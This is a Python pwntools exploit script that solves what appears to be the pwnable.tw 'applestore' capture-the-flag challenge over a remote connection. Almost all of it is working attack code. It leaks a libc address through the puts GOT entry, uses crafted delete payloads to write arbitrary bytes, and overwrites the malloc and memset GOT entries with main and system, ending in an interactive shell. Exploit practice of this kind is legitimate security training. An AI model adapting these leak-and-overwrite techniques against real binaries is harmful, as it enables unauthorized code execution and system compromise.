from pwn import *
import struct

prices_needed = [199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 399, 399, 399, 399, 499, 499, 499, 499]
phones_map = {199: 1, 299: 2, 499: 3, 399: 4}
phones = sorted([phones_map[price] for price in prices_needed])

print(phones)

#r = process(["gdbserver", "localhost:1234", "./applestore"])
#r = process("applestore")
r = remote("chall.pwnable.tw", port=10104)

def l32(n):
    return n.to_bytes(4, "little")

def recvuntil(s):
    result = r.recvuntil(s)
    return result

def sendline(s):
    r.sendline(s)

def add_item(id):
    recvuntil("> ")
    sendline("2")
    recvuntil("> ")
    sendline(str(id))

def checkout():
    recvuntil("> ")
    sendline("5")
    recvuntil("> ")
    sendline("y")

def delete(s):
    recvuntil("> ")
    sendline("3")
    recvuntil("> ")
    sendline(s)

def exit():
    recvuntil("> ")

HOME_PUTS_OFFSET = 0x00067360
REMOTE_PUTS_OFFSET = 0x0005f140
PUTS_OFFSET = REMOTE_PUTS_OFFSET

HOME_SYS_OFFSET = 0x0003cd10
REMOTE_SYS_OFFSET = 0x0003a940
SYS_OFFSET = REMOTE_SYS_OFFSET

test_print = 0x0804904E

puts_got = 0x0804B028

memset_got = 0x0804B038
malloc_got = 0x0804B024
dummy = 0x0804B068

MAIN = 0x08048CA6

for phone in phones:
    add_item(phone)

checkout()

#get global offset table for libc offset
payload1 = l32(puts_got)

delete(b"27" + payload1)
recvuntil("27:")
addr_b = r.recvuntil(" from your")[:4]
addr = struct.unpack("<I", addr_b)[0]
print(addr_b.hex())
print(hex(addr))

LIBC_BASE = addr - PUTS_OFFSET
print(hex(LIBC_BASE+SYS_OFFSET))

# leak address of stack
# payload1 = l32(puts_got)
# delete(b"27" + payload1)
STACK_START= b'\xb1\x04\x08'

def write_address(target, data):
    for i in range(4):
        payload = l32(test_print) + l32(0xDEADBEEF) + l32(target - 12 + i) + l32(data)[i:i+1] + STACK_START
        delete(b"27" + payload)

def write_raw(target, data):
    for i in range(len(data)):
        payload = l32(test_print) + l32(0xDEADBEEF) + l32(target - 12 + i) + data[i:i+1] + STACK_START
        delete(b"27" + payload)

write_address(malloc_got, MAIN)
write_address(malloc_got, MAIN)
write_address(memset_got, LIBC_BASE + SYS_OFFSET)
write_raw(dummy, b"sh \x00")
add_item(2)

r.interactive()

#7174
#x/8xw 0x0804B068
#x/8xw 0x0804B070
#x/4x 0xffffd1b8